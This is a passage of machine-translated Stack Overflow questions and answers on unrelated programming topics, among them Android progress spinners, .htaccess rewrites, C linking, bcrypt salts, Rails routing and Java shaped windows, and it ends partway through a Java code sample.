> 标签：android, android-actionbar

是否可以显示进度指示器（使用 requestWindowFeature(Window.FEATURE_INDETERMINATE_PROGRESS) 代替刷新按钮显示的进度指示器？

这个想法是像 Gmail 客户端一样工作：当不加载时显示刷新按钮和加载时显示不确定的微调器代替刷新按钮

* * *

## 回答 #1

> 赞同：53
> 
> 时间：2012-09-03T21:24:02.610

是的，您可以通过这种方式轻松完成。

```
private MenuItem refresh;
.
.
.

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    getSupportMenuInflater().inflate(R.menu.options_menu, menu);

    // refresh menu item
    refresh = menu.findItem(R.id.refresh_option_item);

    return super.onCreateOptionsMenu(menu);
} 
```

您必须像上面一样获取刷新菜单项，然后，您可以启用如下所示的旋转项：

```
refresh.setActionView(R.layout.actionbar_indeterminate_progress); 
```

当你的任务完成后，你可以像下面这样禁用旋转：

```
refresh.setActionView(null); 
```

最后，`actionbar_indeterminate_progress.xml`可以是这样的：

```
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="64dp"
    android:layout_height="wrap_content"
    android:gravity="center">
    <ProgressBar android:layout_width="32dp"
        android:layout_height="32dp"
        android:layout_gravity="center"
        style="?android:attr/indeterminateProgressStyle" />
</FrameLayout> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T14:49:58.683

您可以尝试以下操作：将刷新按钮和不确定微调器都放在 a `FrameLayout`中，这样两者就堆叠在 z 平面上，显示在屏幕上的相同位置。然后你只需要使用可见性。如果要显示刷新按钮，请将微调器设置为不可见，将按钮设置为可见。如果要显示微调器，请将其设置为可见，将按钮设置为不可见。

# css - 需要向菜单栏添加一个额外的部分，但代码不会改变它

> ID：10676518
> 
> 赞同：0
> 
> 时间：2012-05-20T19:31:33.957
> 
> 标签：css, navigation, menubar

我需要在我的网站主页（和其他页面）顶部的菜单栏中添加一个“工作”页面

当我尝试通过重复创建当前菜单栏的代码来添加一个时，它会将其添加到“主页”选项卡下方。我需要它在每个页面的“联系我们”链接旁边。

我查看了 css 页面，但我没有创建它，也不知道如何让它按我想要的方式显示。

请帮我

```
/*menu*/
.menu { padding:10px 0 0 0; margin:0 ; width:410px;  float:left; }
.menu ul {  padding:0; margin:0; list-style:none; border:0; float:right;}
.menu ul li { float:left; margin:0; padding:0 5px; border:0;}
.menu ul li a { float:left; margin:6; padding:9px 0; color:#fff; font:normal 14px Arial, Helvetica, sans-serif; text-decoration:none;}
.menu ul li a span { padding:10px 15px; background:none;}
.menu ul li a:hover {  background: url(images/menutest.gif) no-repeat right;}
.menu ul li a:hover span {   background:url(images/menutest.gif) no-repeat left;}
.menu ul li a.active {  background:url(images/menutest.gif) no-repeat right;}
.menu ul li a.active span {  background:url(images/menutest.gif) no-repeat left;} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T19:58:49.630

增加 .menu 的宽度可能对您有用，因为您已经设置了 .menu 的宽度。如果你不想改变宽度，也许你可以减少 .menu ul 的 Li 内的 spans 的填充。

# c - 是什么导致make中未定义的引用？

> ID：10676520
> 
> 赞同：0
> 
> 时间：2012-05-20T19:31:47.897
> 
> 标签：c

下面的 make 输出显示了一个未定义的引用，我不确定是什么原因造成的。有人可以帮忙吗？

```
"/usr/bin/make" -f nbproject/Makefile-Debug.mk QMAKE= SUBPROJECTS= .build-conf
make[1]: Entering directory `/cygdrive/g/workspace/c_cpp/MongoDriverTest'
"/usr/bin/make"  -f nbproject/Makefile-Debug.mk dist/Debug/Cygwin_4.x-Windows/mongodrivertest.exe
make[2]: Entering directory `/cygdrive/g/workspace/c_cpp/MongoDriverTest'
mkdir -p build/Debug/Cygwin_4.x-Windows
rm -f build/Debug/Cygwin_4.x-Windows/main.o.d
gcc -std=c99   -c -g -I../mongodb-mongo-c-driver/src/\*.c -MMD -MP -MF build/Debug/Cygwin_4.x-Windows/main.o.d -o build/Debug/Cygwin_4.x-Windows/main.o main.c
mkdir -p dist/Debug/Cygwin_4.x-Windows
gcc -std=c99    -o dist/Debug/Cygwin_4.x-Windows/mongodrivertest build/Debug/Cygwin_4.x-Windows/main.o  
nbproject/Makefile-Debug.mk:61: recipe for target `dist/Debug/Cygwin_4.x-Windows/mongodrivertest.exe' failed
make[2]: Leaving directory `/cygdrive/g/workspace/c_cpp/MongoDriverTest'
nbproject/Makefile-Debug.mk:58: recipe for target `.build-conf' failed
make[1]: Leaving directory `/cygdrive/g/workspace/c_cpp/MongoDriverTest'
nbproject/Makefile-impl.mk:39: recipe for target `.build-impl' failed
build/Debug/Cygwin_4.x-Windows/main.o: In function `main':
/cygdrive/g/workspace/c_cpp/MongoDriverTest/main.c:19: undefined reference to `_mongo_connect'
collect2: ld returned 1 exit status
make[2]: *** [dist/Debug/Cygwin_4.x-Windows/mongodrivertest.exe] Error 1
make[1]: *** [.build-conf] Error 2
make: *** [.build-impl] Error 2 
```

这是我的 main.c 的内容：

```
#include <stdio.h>
#include <stdlib.h>
#include "../mongodb-mongo-c-driver/src/mongo.h"

int main(int argc, char** argv) {
    int status;
    mongo conn[1];

    status=mongo_connect(conn, "127.0.0.1", 27017);
    return EXIT_SUCCESS;
} 
```

前两天还在工作，我重新安装了操作系统，现在它不再工作了，我似乎没有找到原因。mongo.h 存在，mongo.o 也存在。mongo_connect 在 mongo.c 中。任何想法？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T19:35:45.577

您的链接线是：

```
gcc -std=c99 -o dist/Debug/Cygwin_4.x-Windows/mongodrivertest build/Debug/Cygwin_4.x-Windows/main.o 
```

它没有告诉 GCC 从哪里收集`mongo_connect()`。您需要在命令行中指定 Mongo 库。

鉴于源代码中的包含行：

```
#include "../mongodb-mongo-c-driver/src/mongo.h" 
```

您可以添加选项：

```
-L../mongodb-mongo-c-driver/lib -lmongo 
```

到链接线。位置和库名称都是猜测。那将拾取`libmongo.dll`或`libmongo.lib`从指定的目录。

如果在目录下找不到库，则`../mongodb-mongo-c-driver`可能必须在某个地方构建和安装它。或者，它可能已经安装，您只需要确保您引用了正确的安装位置。

* * *

此外，作为一般规则，请避免在源代码中使用类似的路径名。您应该指定：

```
#include "mongo.h" 
```

并提供一个编译行选项来指定在哪里寻找它：

```
-I../mongodb-mongo-c-driver/src 
```

另请参阅：[相对路径（例如`#include "../include/header.h"`标题）有什么好处？](https://stackoverflow.com/questions/597318/what-are-the-benefits-of-a-relative-path-such-as-include-header-h-for-a-hea).

# security - 如果使用 OAuth 身份验证，是否需要传统的用户/密码登录？

> ID：10676527
> 
> 赞同：1
> 
> 时间：2012-05-20T19:33:08.743
> 
> 标签：security, authentication, login, oauth

我正在编写一个具有 Google OAuth 要求的 Web 应用程序。

你认为我需要一个“传统”登录（用户/密码）还是我存储电子邮件和访问令牌，加密，就足够了？

我的所有用户都有一个 Google 帐户。

# php - 如何编写 htaccess 通配符条件

> ID：10676529
> 
> 赞同：0
> 
> 时间：2012-05-20T19:33:32.823
> 
> 标签：php, apache, .htaccess, mod-rewrite

我有这个

```
#RewriteCond %{HTTP_HOST} ^([^\.]+)\.localhost$ [NC]
#RewriteRule ^$ /s/index.php?s=%1 [L] 
```

在这种情况下，每当我调用 test.localhost 时，它都会从 localhost/s/index.php?s=test 获取内容

但是，当我在地址栏中键入 www.localhost 时，它不应该从 /s/index.php 获取内容。

我如何在 htaccess 中写入条件。

例如，如果是 www = 不从 /s/index.php 获取内容

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T19:35:59.273

你只需要另一个`RewriteCond`来排除`www.`：

```
# Matches all subdomains:
RewriteCond %{HTTP_HOST} ^([^\.]+)\.localhost$ [NC]
# But then excludes www.
RewriteCond %{HTTP_HOST} !^www\. [NC]
RewriteRule ^$ /s/index.php?s=%1 [L] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T19:38:49.377

因此，您希望*.localhost 访问 localhost/s/index.php?s=*以获取*除*www.localhost 之外的所有内容？最简单和最具体的方法是：

```
RewriteCond %{HTTP_HOST} ^([^\.]+)\.localhost$ [NC]
RewriteCond %{HTTP_HOST} !=www.localhost [NC]
RewriteRule ^$ /s/index.php?s=%1 [L] 
```

这使用了 RewriteCond 的“词法相等”检查，它应该是最准确的，并且比正则表达式快一点。

# bash - 在 Bash 中打印接收到的参数

> ID：10676534
> 
> 赞同：0
> 
> 时间：2012-05-20T19:34:25.513
> 
> 标签：bash

我需要在每一行的末尾打印一个接收到的参数......这是我所做的：

在没有用户的情况下打印信息：
代码

```
user=$1
while read line; do
       linearr=($line)
       echo "${linearr[2]} ${linearr[0]} ${linearr[3]}"
done 
```

输出：

```
b name2 5
c name3 2
a name1 0 
```

在每行末尾与用户一起打印信息：
代码：

```
user=$1
while read line; do
       linearr=($line)
       echo "${linearr[2]} ${linearr[0]} ${linearr[3]} $user"
done 
```

输出：

```
omare2 5
omare3 2
omare1 0 
```

如果我打印用户 ( `echo $user`)，它通常会打印名称 (omar)... 为什么会这样？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T19:39:48.563

很可能`${linearr[3]}`以`\r`. （`$user`也可以从那个字符开始。）

（如果您从具有 Windows 类型行尾的文件重定向，则可能会发生这种情况`\r\n`。）

# java - 领域对象中的业务逻辑

> ID：10676539
> 
> 赞同：3
> 
> 时间：2012-05-20T19:34:42.223
> 
> 标签：java, spring, jpa-2.0, business-logic, autowired

我正在为网站编写功能区/成就系统，我必须为系统中的每个功能区编写一些逻辑。例如，如果您是注册网站的前 2,000 人中或在论坛中发帖 1,000 条之后，您就可以获得勋章。这个想法与stackoverflow的徽章非常相似，真的。

因此，每个功能区显然都在数据库中，但它们还需要一些逻辑来确定用户何时获得功能区。

以我编码的方式，`Ribbon`是一个简单的界面：

```
public interface Ribbon {
    public void setId(int id);
    public int getId();
    public String getTitle();
    public void setTitle(String title);
    public boolean isEarned(User user);
} 
```

`RibbonJpa`是实现`Ribbon`接口的抽象类，避免了`isEarned()`方法的定义：

```
@Entity
@Table(name = "ribbon")
@Inheritance(strategy = InheritanceType.SINGLE_TABLE)
@DiscriminatorColumn(name = "ribbon_type")
public abstract class RibbonJpa implements Ribbon {
    @Id
    @Column(name = "id", nullable = false)
    int id;

    @Column(name = "title", nullable = false)
    private String title;

    @Override
    public int getId() {
        return id;
    }

    @Override
    public void setId(int id) {
        this.id= id;
    }

    @Override
    public String getTitle() {
        return title;
    }

    @Override
    public void setTitle(String title) {
        this.title = title;
    }
} 
```

您可以看到我将继承策略定义为`SINGLE_TABLE`（因为我必须编写 50 个功能区之类的代码，并且我不需要为它们中的任何一个添加额外的列）。

现在，一个特定的功能区将像这样实现：

```
@Entity
public class FirstUsersRibbon extends RibbonJpa implements Ribbon {
    public FirstUsersRibbon() {
        super.setId(1);
        super.setTitle("First 2,000 users registered to the website");
    }

    @Override
    public boolean isEarned(User user) {
        // My logic to check whether the specified user has won the award
    }
} 
```

这段代码工作正常，表以我期望的方式在数据库中创建（我在本地环境中使用 DDL 生成）。

问题是，在域对象中编写业务逻辑感觉是错误的。这是好习惯吗？您能提出更好的解决方案吗？此外，我无法自动装配实体 ( `FirstUsersRibbon`) 中的任何 DAO，我需要在业务逻辑中使用它们（在这种情况下，我需要一个 DAO 来检查用户是否在注册到网站的前 2,000 个用户中）。

非常感谢任何帮助。

谢谢！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-20T19:41:13.013

> 问题是，在域对象中编写业务逻辑感觉是错误的。

许多人会说相反的情况是正确的：在其他任何地方都有业务逻辑是一种反模式（一种[贫血的领域模型）。](http://en.wikipedia.org/wiki/Anemic_domain_model)有关详细信息，请参阅[领域驱动设计](http://en.wikipedia.org/wiki/Domain-driven_design)。

然后您可能想知道传统 3 层架构的中间层是干什么用的。它为应用程序提供了一个*服务层*。请参阅我的相关问题“ [EJB 有什么用途？](https://stackoverflow.com/questions/5579890/what-use-are-ejbs) ”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T20:23:26.983

> 此外，我无法自动装配实体中的任何 DAO

如果您使用 Spring 和 Hibernate，请查看[http://jblewitt.com/blog/?p=129](http://jblewitt.com/blog/?p=129)：这很好地描述了具有各种解决方案的类似问题。

如果您正在以您描述的方式寻找丰富的域模型，那么通过 Spring 实例化域对象可能是一个好主意，因此能够将 DAO 注入到您的域对象中。

# android - 不同的 WebView-Results

> ID：10676541
> 
> 赞同：0
> 
> 时间：2012-05-20T19:34:57.550
> 
> 标签：android, webview, android-webview

我需要全屏打开一个网站，我用这种方式：

```
webSettings.setLoadWithOverviewMode(true);
webSettings.setUseWideViewPort(true); 
```

到目前为止，没有任何问题。

打电话后，`loadURL`我得到了一个网站，该网站不在“概览模式”中（只是整个网站的一部分）。当我`loadURL`第一次打电话后再次打电话时，一切都合适。

为什么我要打`loadURL`两次电话？

被调用的网站包含一点点`jQuery`，但这不应该对大小感兴趣吗？

此外，我设置了`webSettings.setRenderPriority(RenderPriority.HIGH)`.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T19:44:57.770

也许您正在加载的网站具有视口元标记并且正在设置自己的视口？

# php - BCRYPT 和 Random SALTS 一起在数据库中

> ID：10676542
> 
> 赞同：1
> 
> 时间：2012-05-20T19:34:59.213
> 
> 标签：php, mysql, security, encryption, bcrypt

我正在升级我的网站的安全级别。

在研究存储密码的最佳方法时，我在 PHP 5.3 中发现了 BCRYPT 选项。我已经实现了这个函数来使用静态 SALT，但是我读到每个密码都应该有不同的 SALT 或者违背了目的。

我应该将 SALT 与用户记录以纯文本形式存储在数据库中吗？这是否也违背了目的？或者我应该使用 md5 散列盐并将其存储在数据库中？

实现这个和存储 SALT 时最好的方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T07:38:54.963

bcrypt的[模块化 crypt 格式确实已经包含 128 位 salt](https://stackoverflow.com/a/5882472/53114)。因此，除非您使用与此不同的实现，否则您不需要另一种盐。

请注意，盐的主要目的是使每个输入都是唯一的，因此查找表辅助字典攻击存储的值是不切实际的。

* * *

[Jacco](https://stackoverflow.com/users/22674/jacco)提醒我 PHP 的原生 bcrypt 实现[`crypt`](http://php.net/crypt)不会自动生成盐。所以你必须自己做，例如：

```
$salt = substr(str_replace('+', '.', base64_encode(call_user_func_array('pack', array_merge(array('H14N'), explode('.', uniqid('', true)))).pack('N2', mt_rand(), mt_rand()))), 0, 22);
$hash = crypt($password, '$2a$10$'.$salt.'$'); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-20T19:38:03.767

您应该为每个用户创建一个新的随机盐，并将其与哈希一起存储在数据库中。大多数 bcrypt 实现已经这样做了。如果您查看输出，您会看到它是一个`$`包含盐的分离值。

# pdf - 如何将 3D 模型转换为 SVG 线条图？

> ID：10676544
> 
> 赞同：0
> 
> 时间：2012-05-20T19:35:03.870
> 
> 标签：pdf, 3d, svg, image-conversion

我经常使用以 SolidWorks 或 PDF 文件形式收到的 3D CAD 模型。我需要把它们变成黑白线条艺术，就像你在专利申请中发现的那样。（事实上​​，*就像*您在专利申请中发现的一样！）

Acrobat-9 允许我旋转和缩放模型，因此我可以以合理的分辨率打印它们，但我的绘图工具链的其余部分处理 SVG 文件，而我能从 Acrobat 中得到的只是位图。（我也在 Blender 中从头开始制作模型，并使用那里的渲染程序制作线条图，但这也会产生位图。）

有什么方法可以从 3D 视图到 SVG 图片（最好使用相对简单的贝塞尔曲线和缩放线宽）？

（例如，假设我有一个立方体的 3D 模型。我根据需要定位它，然后（以某种方式）将其转换为 SVG 图像，在边缘处有几条直线，线宽根据距离缩放在边缘和相机/查看器之间。）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T21:35:38.797

如果您已将视图呈现为 PDF 文件，则可以使用[inkscape](http://inkscape.org/)的命令行工具将 PDF 转换为 SVG，如本文[所述](https://stackoverflow.com/a/4123701/547020)。

如果没有可用的渲染 PDF，您可以在转换之前[从 CAD 中导出 PDF 快照。](http://autodesk.blogs.com/between_the_lines/2011/02/how-to-create-a-pdf-from-autocad-with-a-single-click.html)

您还可以尝试为此目的制作的其他转换器，例如[verydoc](http://www.verydoc.com/pdf2vector/pdf-to-svg.html)或[PDF-tron](http://www.pdftron.com/pdf2svg/)。

# html - 使用 .htaccess 删除 .html URL 扩展时出现问题

> ID：10676547
> 
> 赞同：4
> 
> 时间：2012-05-20T19:35:38.473
> 
> 标签：html, .htaccess, url

尝试使用 .htaccess 从站点中删除 .html 扩展名。例如：www.mysite.com/charts.html 将变为 www.mysite.com/charts

以下脚本位于 .htaccess 文件中：

```
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)\.html$ /$1 [L,R=301] 
```

但是在浏览器中输入不带 .html 扩展名的 url 时，会显示 403 Forbidden 错误。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-20T20:08:01.420

我在其他地方找到了这个解决方案：

```
RewriteEngine on
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME}\.html -f
RewriteRule ^(.*)$ $1.html 
```

来源：1）[http://www.catswhocode.com/blog/10-useful-htaccess-snippets-to-have-in-your-toolbox](http://www.catswhocode.com/blog/10-useful-htaccess-snippets-to-have-in-your-toolbox) 2）[http://eisabainyo.net/weblog/2007/08/19 /删除-文件-扩展-通过-htaccess/](http://eisabainyo.net/weblog/2007/08/19/removing-file-extension-via-htaccess/)

# git - git push 从开发服务器到生产服务器

> ID：10676549
> 
> 赞同：0
> 
> 时间：2012-05-20T19:35:47.597
> 
> 标签：git

我有一个开发服务器'dev'，带有我的官方 git repo。

我有一个生产服务器“产品”。

在产品上：

`git clone user@dev:/path-to-my-repo`

`git config receive.denyCurrentBranch ignore`

最后一行是为了让当我`git push`从'dev'执行一个操作时，生产代码会立即更新为我刚刚从'dev'推送的任何内容。

但是，当我`git push`对我的生产服务器进行开发时，它并​​没有这样做！它会发出一些通知，说明比 origin/master 领先一步。自然地，我的产品代码永远不会用手触摸（如果有任何东西被手意外触摸 - 我希望开发人员的推送覆盖它）。我需要对我的产品代表做些什么额外的事情才能使它完全服从来自开发的推送。即，立即将其工作副本更新为刚刚推送的任何内容？

提前致谢！

# r - mapply() 中 MoreArgs 的奇怪之处 - 传递参数的多个值

> ID：10676553
> 
> 赞同：2
> 
> 时间：2012-05-20T19:36:31.390
> 
> 标签：r

昨天，我问了一个[关于](https://stackoverflow.com/questions/10668221/apply-lines-to-columns-of-a-data-frame-matrix-each-line-with-a-different-colo/10668306#10668306)如何在不使用循环的情况下绘制多条（水平）线的问题，每条线都有用户指定的颜色。

我尝试使用建议的函数 matplot() 用相关代码绘制下图中显示的短垂直线。

```
 ci = matrix(1:30, nrow=3, byrow=T)
    ci=list(rbind(ci[1,], ci[1,]+2),
            rbind(ci[2,], ci[2,]+2),
            rbind(ci[3,], ci[3,]+2))
    x = rbind(1:10, 1:10)
    plot(-5, xlim=c(1,10), ylim=c(1,32)) 
    invisible(mapply(matlines, x=list(x), y=ci, 
              col=c("red","blue","black"), 
              lty = 1)) 
```

![情节 1：所需情节](../Images/a9ba5f9d36d20136941b52f5815cf96c.png)

这一切都很好。但是，我试图将此代码包装在一个函数中，并且我希望能够输入一个可选参数列表，然后可以将其传递给 mapply/matlines。我试图在 mapply() 中使用参数 MoreArgs 无济于事。似乎 MoreArgs 采用的论点与其他论点不同。正如您在第一个代码中看到的，列表中的每个项目都有不同的颜色，但是当我将 col 放入列表 args.ci 中时，这 3 种颜色会在列表的每个项目中循环使用。我想知道是否有办法解决这个问题，以便如果我有多个参数值，每个值都会应用于列表的一项。谢谢！

```
 args.ci = list(col=c("red","blue","black"), lty=1:3)
    plot(-5, xlim=c(1,10), ylim=c(1,32)) 
    invisible(mapply(matlines, x=list(x), y=ci, 
              MoreArgs = args.ci)) 
```

![情节2：不是我想要的](../Images/fc207adc83beee8e4d8e514de08fcf26.png)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-20T20:06:37.147

这是解决此类问题的一般方法。您应该能够对其进行调整以更准确地执行您想要的操作：

```
myFun <- function(...) {
    fixedArgs <- list(matlines, x=list(x), y=ci)
    dots <- list(...)
    allArgs <- c(fixedArgs, dots)
    plot(-5, xlim=c(1,10), ylim=c(1,32)) 
    invisible(do.call(mapply, allArgs))
}

myFun(col=c("red","blue","black"), lty=1) 
```

![在此处输入图像描述](../Images/6e3bf5489aef2054a6db9f1f50d73559.png)

# ruby-on-rails - 更改 Rails 路由标准

> ID：10676556
> 
> 赞同：0
> 
> 时间：2012-05-20T19:36:40.040
> 
> 标签：ruby-on-rails, database, ruby-on-rails-3, routing, response.redirect

在我们创建一个新条目后，标准重定向是每次到`:id`. 我怎样才能将其更改为 own_key。我们设计了我们的路线

```
resources :lists
match '/:own_key' => 'lists/show' 
```

如果我们创建一个新条目，重定向转到 /list/:id

有没有办法将其更改为重定向到 own_key？

```
def create
  @list = List.new(params[:list])
  @list = List.create!(params[:list])
  respond_with(@list)
end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T09:15:06.797

每个模型都有一个`to_param`可以覆盖的方法调用

列表.rb

```
class Bar < ActiveRecord::Base
  def to_param
    "#{own_key}.parameterize"
  end
end 
```

这将使路径从`/:id`, 变为`/:own_key`。

注意：这只会更改参数的值，但不会更改参数的名称。

示例：如果您想访问show 操作的`own_key`值，则不会有. 您可以通过 with 访问该值，但不能通过 with`foo``/lists/foo``params[:own_key]``own_key``params[:id]``params[:own_key]`

```
Parameters: {"id"=>"foo"} 
```

# wpf - 在 WPF 应用程序中实时查看数据库记录

> ID：10676557
> 
> 赞同：2
> 
> 时间：2012-05-20T19:36:41.857
> 
> 标签：wpf, linq, events, ms-access, dataset

免责声明：我必须使用 microsoft access 数据库，并且我无法将我的应用程序连接到服务器以订阅任何服务。

我正在使用 VB.net 创建 WPF 应用程序。我正在根据访问数据库中的记录填充列表视图，当应用程序加载并填充数据集时，我会查询一次。然后，我使用 LINQ 数据集根据过滤器等向用户显示数据。

但是.. 访问表在一天中会被多次修改，这意味着如果用户不重新加载应用程序，随着时间的推移，用户将拥有“旧数据”。有没有办法将 access 数据库连接到 VB.net 应用程序，以便在数据库中添加、删除或修改记录时引发事件？我对事件处理程序中所需的任何代码都很好。我只需要找出一种方法来从访问表中触发 vb.net 应用程序事件。

想一想我正在尝试做的事情是查看对数据库表的实时编辑，但在应用程序中.. 非常感谢任何帮助，如果您需要任何澄清，请告诉我 - 我只需要一个总体方向，我很高兴进行更多研究。

我的解决思路：

*   为 ms 访问更改创建审计表
*   在用户应用程序中创建单独的工作线程，以每 60 秒查询审计表的更改
*   如果发现更改，它将修改受影响的数据集记录
*   在数据集记录更新时引发事件以刷新任何受影响的对象/属性

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T02:02:33.583

有几种方法可以做你想做的事，但你在你的过程中基本上是正确的。

据我所知，没有直接的方法可以从数据库驱动程序中获取事件来让您知道发生了什么变化，因此轮询是唯一的解决方案。

*   我的 MS Access 数据库是一个 Access 2010 ACCDB 数据库，并且您正在使用它的 ACE 驱动程序（如果运行应用程序的计算机上没有安装 Access），您可以使用新的[数据宏触发器](http://blogs.office.com/b/microsoft-access/archive/2009/08/13/access-2010-data-macros-similar-to-triggers.aspx)来记录对表的更改在数据库中自动添加到审计表中，该表将根据需要记录新插入的更新、删除等。
    这种方法是最好的，因为这些发生在 ACE 数据库驱动程序级别，因此它们将尽可能高效和透明。

*   如果您使用的是旧版本的 Access，则必须自己实施审核。[Allen Browne 对此有一篇很好的文章](http://allenbrowne.com/appaudit.html)。一些搜索也会带来[其他解决方案](http://support.microsoft.com/kb/197592)。

*   您也可以在需要监控的表上运行一些查询

在任何情况下，您都需要监控您提到的审计或数据表。
您可以监控比 60 秒更频繁的更改，具体取决于数据库的负载、客户端的数量等，您可以轻松地每隔几秒钟检查一次。

我会建议你：

*   在您的应用程序运行时保持与数据库的永久连接：打开一个虚拟表进行读取，并且在您关闭应用程序之前不要关闭它。这对任何人都没有性能成本，但它将确保昂贵的锁定文件创建只进行一次，而不是针对您运行的每个查询。这可能具有巨大的性能导入。有关原因的更多信息，请参阅[本文](http://immitev.blogspot.com/2005/01/where-is-ole-db-connection-pooling_28.html)。

*   让您的审计表（或您的数据表）易于监控：包括一个时间戳列，用于记录创建和上次修改记录的时间。这使得检查更改非常快速有效：您只需要检查最近的记录修改日期是否与您阅读的最后一个匹配。
    使用 Access 2010，很容易添加触发器来执行此操作。对于旧版本，您需要在表单级别执行此操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-20T19:52:03.543

**如果您使用的是 SQL Server**

在 SQL 2005 之前，您可以使用[通知服务](http://en.wikipedia.org/wiki/SQL_Server_Notification_Services)

自 SQL Server 2008 R2 以来，它已被[StreamInsight取代](http://www.microsoft.com/sqlserver/en/us/solutions-technologies/business-intelligence/complex-event-processing.aspx)

**其他数据库管理系统和替代品**

[甲骨文](http://docs.oracle.com/cd/B19306_01/appdev.102/b14251/adfns_dcn.htm)

[处理中间层的变化并向客户端发出信号](https://stackoverflow.com/questions/10297892/wcf-duplex-push-different-notifications-to-each-client)

或投票。这需要您配置时间间隔，这样您就不会错过太长时间的更改。

**一般来说**

当服务器必须能够向客户端发送消息时，它需要保持通道/套接字对客户端开放，当有很多客户端时，这可能会变得非常昂贵。我建议不要使用服务器推送并尝试进行智能轮询。智能轮询意味着尽可能大的间隔，并在服务器上进行适当的缓存，以防止对同一数据多次访问数据库。

# java - 带有大纲的 Java 形状窗口

> ID：10676564
> 
> 赞同：4
> 
> 时间：2012-05-20T19:37:49.633
> 
> 标签：java, swing, shaped-window

我成功地渲染了一个多边形窗口。但是，我想用细笔画出它的轮廓。

是否可以在 Java 中勾勒出一个形状的窗口？

这是我的工作代码，我正在使用 componentResized 方法来设置窗口的形状。但是，如果有任何其他方法可以获取大纲，无论是在选项卡窗口最小化时还是选项卡窗口最大化时，请帮助。

```
//LongTab.java
//Desktop Tab

import java.awt.*;
import java.awt.event.*;
import javax.swing.*;
import java.awt.geom.*;
import static java.awt.GraphicsDevice.WindowTranslucency.*;

public class LongTab extends JWindow implements MouseListener{

  static LongTab t;
  Boolean isVisible = false;
  final static BasicStroke stroke = new BasicStroke(2.0f);
  GeneralPath path;

  public LongTab(){
    addMouseListener(this);
    setSize(500, 1080);

    addComponentListener(new ComponentAdapter() {
      @Override
      public void componentResized(ComponentEvent e){
        Polygon polygon = new Polygon();
        polygon = new Polygon();
        polygon.addPoint(40, 1080);
        polygon.addPoint(40, 700);
        polygon.addPoint(20, 690);
        polygon.addPoint(20, 400);
        polygon.addPoint(40, 390);
        polygon.addPoint(40, 0);
        polygon.addPoint(500, 0);
        polygon.addPoint(500, 1080);

        path = new GeneralPath();
        path.append(polygon, true);
        setShape(path);
      }
    });

    setSize(40, 1080);
    setLocation(1880, 0);
  } 

  public void mouseClicked (MouseEvent me) {
    if(!isVisible) {
      isVisible=true;
      t.setSize(400, 1080);
      t.setLocation(1520, 0);
      return;
    }
    if(isVisible) {
      isVisible=false;
      t.setSize(40, 1080);
      t.setLocation(1880, 0);
    }
    return;
  }

  public void mouseEntered (MouseEvent me) {
  }

  public void mousePressed (MouseEvent me) {
  }

  public void mouseReleased (MouseEvent me) {
  } 

  public void paint(Graphics g) {
    Graphics2D g2 = (Graphics2D) g;
    g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);     
    g2.setStroke(stroke);
    //if(!isVisible)
    //g2.draw(path);
    //repaint();
  }

  public void mouseExited (MouseEvent me) {
  }  

  public static void main (String[] args){
    SwingUtilities.invokeLater(new Runnable(){
      @Override
      public void run() {
        GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
        GraphicsDevice gd = ge.getDefaultScreenDevice();

        //If shaped windows aren't supported, exit.
        if (!gd.isWindowTranslucencySupported(PERPIXEL_TRANSPARENT)) {
          System.err.println("Shaped windows are not supported");
          System.exit(0);
        } else {
          t = new LongTab();
          t.setVisible(true)
        }
      }
    });
  }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T23:50:25.270

我修改了您的代码以显示形状的窗口轮廓。

```
 //LongTab.java
//Desktop Tab

import java.awt.BasicStroke;
import java.awt.Color;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.GraphicsDevice;
import java.awt.GraphicsDevice.WindowTranslucency;
import java.awt.GraphicsEnvironment;
import java.awt.Polygon;
import java.awt.RenderingHints;
import java.awt.geom.GeneralPath;

import javax.swing.JFrame;

public class LongTab extends JFrame{

private Polygon polygon;

public LongTab() {
    setSize(500, 720);
    setLocation(10, 10);

    setUndecorated(true);

    polygon = new Polygon();
    polygon = new Polygon();
    polygon.addPoint(40, 720);
    polygon.addPoint(40, 700);
    polygon.addPoint(20, 690);
    polygon.addPoint(20, 400);
    polygon.addPoint(40, 390);
    polygon.addPoint(40, 20);
    polygon.addPoint(500, 20);
    polygon.addPoint(500, 720);

    GeneralPath path = new GeneralPath();
    path.append(polygon, true);
    setShape(path);
}

public void paint(Graphics g) {
    super.paint(g);

    Graphics2D g2 = (Graphics2D) g;
    g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
    g2.setStroke(new BasicStroke(2.0f));
    g2.setColor(Color.RED);
    g2.draw(polygon);
}

public static void main(String[] args) {
    GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
    GraphicsDevice gd = ge.getDefaultScreenDevice();

    // If shaped windows aren't supported, exit.
